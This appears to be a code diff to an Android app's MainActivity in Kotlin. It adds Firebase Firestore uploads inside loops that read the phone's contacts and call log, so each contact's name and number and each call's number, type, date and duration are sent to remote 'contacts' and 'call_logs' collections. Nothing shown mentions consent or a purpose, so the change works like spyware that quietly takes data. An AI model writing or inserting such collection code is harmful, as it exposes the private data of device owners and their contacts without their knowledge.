@@ -18,10 +18,12 @@ import android.util.Log
 import android.widget.Button
 import android.widget.Toast
 import com.google.firebase.FirebaseApp
+import com.google.firebase.firestore.FirebaseFirestore
 
 
 class MainActivity : AppCompatActivity() {
     private val REQUEST_CODE_PERMISSIONS = 1001
+        val db = FirebaseFirestore.getInstance()
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -128,6 +130,8 @@ class MainActivity : AppCompatActivity() {
                 val number =
                     it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                 Log.d("MainActivity", "Contact - Name: $name, Number: $number")
+                uploadContact(Contact(name, number))
+
             }
         }
     }
@@ -163,6 +167,8 @@ class MainActivity : AppCompatActivity() {
                     "MainActivity",
                     "Call Log - Number: $number, Type: $type, Date: $date, Duration: $duration"
                 )
+                uploadCallLog(CallLogEntry(number, type, date, duration))
+
             }
         }
     }
@@ -174,4 +180,28 @@ class MainActivity : AppCompatActivity() {
         startActivity(intent)
     }
 
+
+    private fun uploadContact(contact: Contact) {
+        // Add a new document with a generated ID
+        db.collection("contacts")
+            .add(contact)
+            .addOnSuccessListener { documentReference ->
+                Log.d("MainActivity", "Contact added with ID: ${documentReference.id}")
+            }
+            .addOnFailureListener { e ->
+                Log.e("MainActivity", "Error adding contact", e)
+            }
+    }
+
+    private fun uploadCallLog(callLog: CallLogEntry) {
+        // Add a new document with a generated ID
+        db.collection("call_logs")
+            .add(callLog)
+            .addOnSuccessListener { documentReference ->
+                Log.d("MainActivity", "Call log added with ID: ${documentReference.id}")
+            }
+            .addOnFailureListener { e ->
+                Log.e("MainActivity", "Error adding call log", e)
+            }
+    }
 }
